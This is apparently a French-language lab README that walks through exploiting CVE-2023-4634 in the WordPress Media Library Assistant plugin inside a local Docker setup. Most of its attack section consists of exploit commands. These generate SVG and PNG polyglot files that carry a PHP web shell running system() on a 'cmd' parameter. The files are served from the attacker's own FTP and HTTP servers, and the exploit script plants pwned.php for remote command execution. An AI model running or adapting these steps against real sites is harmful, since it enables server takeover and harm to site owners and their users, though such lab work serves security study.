# ProjetCL

# Tuto CVE-2023-4634

## Cloner le dépôt Git

Pour commencer, clonez le dépôt Git à l'aide de la commande suivante :

```bash
git clone https://github.com/lehazare/ProjetCL.git
```

## Construction et exécution du conteneur WordPress

Pour exécuter le conteneur WordPress, utilisez la commande suivante :

```bash
docker-compose up
```

## Installation du plugin MLA en version compromise (ex : 3.07) sur WordPress

Consultez la vidéo pour des instructions détaillées sur l'installation du plugin MLA.

## Tester avec Nuclei

Cette étape est optionnelle mais vous permet de vous assurer que l'image WordPress est correctement configurée et que le plugin MLA est installé dans une version compromise.

1. Installez Nuclei en utilisant la commande appropriée pour votre système (`brew install nuclei`, `sudo apt install nuclei`, etc.).
2. Utilisez la commande suivante pour tester avec Nuclei :

```bash
nuclei -u http://0.0.0.0:8080 -t ./CVE-2023-4634.yaml
```

> Note : Modifiez `0.0.0.0:8080` en fonction de l'emplacement où votre conteneur WordPress est en cours d'exécution.

## Début de l'attaque

### Objectif

L'objectif est d'accéder à l'URL suivante :

```
http://localhost:8080/pwned.php?cmd=ls
```

### Installation des modules Python nécessaires

Installez les modules Python nécessaires en utilisant la commande suivante :

```bash
python3 -m pip install -r requirements.txt
```

### Pour tester

Pour effectuer un test, utilisez la commande suivante :

```bash
python3 CVE-2023-4634.py -h
```

### Trouver l'adresse de sa machine

Utilisez la commande suivante pour obtenir l'adresse IP de votre machine :

```bash
ifconfig
```

Vous pouvez tester la connectivité en utilisant la commande `ping`.

### FTP

Génération des fichiers SVG :

```bash
python3 CVE-2023-4634.py --generatesvg --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg --remotehttp http://192.168.1.103:8081 --png_polyglot_name virus.png --webserverpath /var/www/html --exploitname pwned.php
```

Créez un serveur FTP avec les fichiers SVG en exécutant la commande suivante dans le répertoire `remote_ftp` :

```bash
cd remote_ftp && python3 -m pyftpdlib -p 2122
```

### HTTP

Génération de l'image virus :

```bash
python3 CVE-2023-4634.py --generatepng --payload "<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>" --png_polyglot_name virus.png
```

Créez un serveur HTTP avec l'image virus en exécutant la commande suivante dans le répertoire `exploit-png` :

```bash
cd exploit-png && python3 -m http.server 8081
```

### Exploitation

Pour l'exploitation, utilisez la commande suivante :

```bash
python3 CVE-2023-4634.py --target http://localhost:8080 --remoteftp ftp://192.168.1.103:2122 --remotehttp http://192.168.1.103:8081 --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg --png_polyglot_name virus.png --exploitname pwned.php
```

Vous pouvez tester l'exploit en ajoutant une commande à l'URL, par exemple :

```
http://localhost:8080/pwned.php?cmd=ls
```

Consultez la vidéo pour plus de détails.

https://www.youtube.com/watch?v=Xb5MUyxAxYg

[![Tuto YTB](https://img.youtube.com/vi/Flb3U_eNvj0/0.jpg)](https://www.youtube.com/watch?v=Flb3U_eNvj0)




Special credits to https://github.com/Patrowl/CVE-2023-4634/


